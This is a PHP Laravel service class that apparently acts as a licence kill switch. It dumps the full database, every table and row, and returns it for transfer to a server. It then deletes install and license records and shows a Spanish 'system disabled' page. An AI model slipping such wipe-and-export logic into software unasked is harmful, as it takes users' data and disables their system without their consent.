<?php

namespace App\Services;

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\File;

class WipeService
{
    /**
     * Create DB backup and return raw content for transfer to server.
     */
    public function generateBackupStream()
    {
        try {
            // Run Spatie DB Backup
            Artisan::call('backup:run', ['--only-db' => true]);

            $backupName = config('backup.backup.name', 'Laravel');
            $disk = Storage::disk('backup');

            if ($disk->exists($backupName)) {
                $files = $disk->files($backupName);
                if (!empty($files)) {
                    // Sort descending by modified time to pick latest zip
                    usort($files, function ($a, $b) use ($disk) {
                        return $disk->lastModified($b) <=> $disk->lastModified($a);
                    });

                    $latestFile = $files[0];
                    return $disk->get($latestFile);
                }
            }
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error("Spatie Backup failed during wipe: " . $e->getMessage());
        }

        // Fallback: Generate SQL dump directly via DB unprepared export if spatie backup fails
        return $this->generateRawSqlDump();
    }

    /**
     * Execute the local uninstallation & create wipe lock.
     */
    public function executeLocalWipe()
    {
        $wipedFile = storage_path('wiped');
        file_put_contents($wipedFile, 'SYSTEM WIPED ON ' . date('Y-m-d H:i:s'));

        // Delete installed lock file if present
        if (File::exists(storage_path('installed'))) {
            File::delete(storage_path('installed'));
        }

        // Clear active license cache
        \Illuminate\Support\Facades\Cache::forget('active_license_v2');

        // Delete active license records from DB
        try {
            \App\Models\License::truncate();
        } catch (\Exception $e) {}

        return true;
    }

    /**
     * Render the uninstalled notice HTML screen.
     */
    public static function renderWipedScreen()
    {
        return response(<<<HTML
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema Inhabilitado</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .card {
            background-color: #1e293b;
            border: 1px solid #ef4444;
            border-radius: 16px;
            padding: 40px;
            max-width: 550px;
            text-align: center;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
        }
        .icon {
            font-size: 50px;
            color: #ef4444;
            margin-bottom: 20px;
        }
        h1 {
            color: #ef4444;
            font-size: 24px;
            margin-top: 0;
            margin-bottom: 12px;
            letter-spacing: 0.5px;
        }
        p {
            color: #cbd5e1;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .footer {
            font-size: 13px;
            color: #64748b;
            border-top: 1px solid #334155;
            padding-top: 16px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">⚠️</div>
        <h1>SISTEMA INHABILITADO</h1>
        <p>Esta instalación ha sido desactivada e inhabilitada por incumplimiento de contrato o término de licencia del servicio.</p>
        <div class="footer">
            Contacte a su proveedor de soporte técnico de licencias para regularizar la situación.
        </div>
    </div>
</body>
</html>
HTML, 403);
    }

    private function generateRawSqlDump()
    {
        $tables = \Illuminate\Support\Facades\DB::select('SHOW TABLES');
        $dbName = config('database.connections.mysql.database');
        $key = 'Tables_in_' . $dbName;

        $sql = "-- SQL Dump Fallback\n-- Generated on " . date('Y-m-d H:i:s') . "\n\n";
        
        foreach ($tables as $table) {
            $tableName = $table->$key;
            $create = \Illuminate\Support\Facades\DB::select("SHOW CREATE TABLE `{$tableName}`");
            $sql .= $create[0]->{'Create Table'} . ";\n\n";

            $rows = \Illuminate\Support\Facades\DB::table($tableName)->get();
            foreach ($rows as $row) {
                $values = array_map(function ($val) {
                    return is_null($val) ? 'NULL' : \Illuminate\Support\Facades\DB::getPdo()->quote($val);
                }, (array) $row);
                $sql .= "INSERT INTO `{$tableName}` VALUES (" . implode(', ', $values) . ");\n";
            }
            $sql .= "\n";
        }

        return $sql;
    }
}
